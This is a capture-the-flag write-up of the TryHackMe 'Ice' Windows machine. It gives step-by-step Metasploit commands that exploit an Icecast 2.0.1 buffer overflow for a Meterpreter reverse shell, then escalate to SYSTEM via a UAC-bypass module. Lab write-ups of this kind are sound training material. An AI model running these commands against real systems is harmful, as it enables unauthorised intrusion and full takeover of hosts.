# 🧊 Ice - TryHackMe

## 📌 Information

| Field          | Value                                                    |
| -------------- | -------------------------------------------------------- |
| **Machine**    | Ice                                                      |
| **Platform**   | TryHackMe                                                |
| **Difficulty** | Easy                                                     |
| **OS**         | Windows                                                  |
| **Category**   | Reconnaissance / RCE / Metasploit / Privilege Escalation |

---

# 🎯 Objective

Gain SYSTEM access to the target Windows machine and retrieve the available flags by exploiting a vulnerable service.

---

# 🛰️ Reconnaissance

The first step was identifying open ports and running services using **Nmap**.

### Scan

```bash
nmap -sC -sV -oN scan.txt MACHINE_IP
```

### Results

| Port | Service | Version                        |
| ---- | ------- | ------------------------------ |
| 135  | MSRPC   | Microsoft Windows RPC          |
| 139  | NetBIOS | Microsoft Windows              |
| 445  | SMB     | Microsoft Windows              |
| 3389 | RDP     | Remote Desktop                 |
| 5357 | HTTP    | Microsoft HTTPAPI              |
| 8000 | HTTP    | Icecast Streaming Media Server |

### Notes

* The Icecast web service was exposed on port **8000**.
* The service version appeared to be outdated.
* Searching for known vulnerabilities revealed a public remote code execution vulnerability.

---

# 🔍 Enumeration

After identifying the Icecast service, I searched for known exploits.

```bash
searchsploit icecast
```

The results showed that **Icecast 2.0.1** is vulnerable to a **buffer overflow** allowing remote code execution.

Metasploit also contains a module for this vulnerability.

---

# 💥 Exploitation

### Vulnerability

* **Icecast 2.0.1**
* Remote Buffer Overflow
* Unauthenticated Remote Code Execution

### Exploit Used

```text
exploit/windows/http/icecast_header
```

### Metasploit

```bash
msfconsole
```

```bash
search icecast
```

```bash
use exploit/windows/http/icecast_header
```

Configure the exploit:

```bash
set RHOSTS MACHINE_IP
set LHOST YOUR_IP
run
```

### Result

A Meterpreter session was successfully opened.

---

# ⬆️ Privilege Escalation

The initial shell did not have SYSTEM privileges.

### Background the session

```bash
background
```

### Suggested Exploit Suggester

```bash
use post/multi/recon/local_exploit_suggester
```

Configure the module:

```bash
set SESSION 1
run
```

The module suggested several privilege escalation techniques.

The recommended exploit was:

```text
exploit/windows/local/bypassuac_eventvwr
```

or the exploit suggested by the module on the target system.

After configuring the exploit:

```bash
set SESSION 1
run
```

A new Meterpreter session was opened with elevated privileges.

### Verify Privileges

```bash
getuid
```

Output:

```text
NT AUTHORITY\SYSTEM
```

---

# 🚩 Flags

## User Flag

```
<flag>
```

## Root / Administrator Flag

```
<flag>
```

---

# 📚 What I Learned

* Performing Windows reconnaissance with Nmap.
* Identifying vulnerable services through version detection.
* Using Searchsploit to discover public exploits.
* Exploiting Icecast 2.0.1 with Metasploit.
* Using Meterpreter effectively.
* Enumerating privilege escalation opportunities.
* Escalating privileges to NT AUTHORITY\SYSTEM.

---

# 🛠️ Tools Used

* Nmap
* Searchsploit
* Metasploit Framework
* Meterpreter

---

# 📖 MITRE ATT&CK

| Technique | Description                           |
| --------- | ------------------------------------- |
| T1046     | Network Service Discovery             |
| T1190     | Exploit Public-Facing Application     |
| T1059     | Command and Scripting Interpreter     |
| T1068     | Exploitation for Privilege Escalation |
| T1105     | Ingress Tool Transfer                 |

---

# 📷 Screenshots

Recommended screenshots:

* Nmap scan
* Icecast web interface
* Searchsploit results
* Metasploit configuration
* Successful Meterpreter session
* Privilege escalation
* SYSTEM shell
* Flag retrieval

---

# ✅ Summary

Ice is an excellent beginner-friendly Windows machine that introduces the complete penetration testing workflow. The box focuses on identifying a vulnerable public-facing application, exploiting it with Metasploit, obtaining a Meterpreter shell, and escalating privileges to **NT AUTHORITY\SYSTEM**. It provides practical experience with service enumeration, exploit selection, post-exploitation, and Windows privilege escalation.
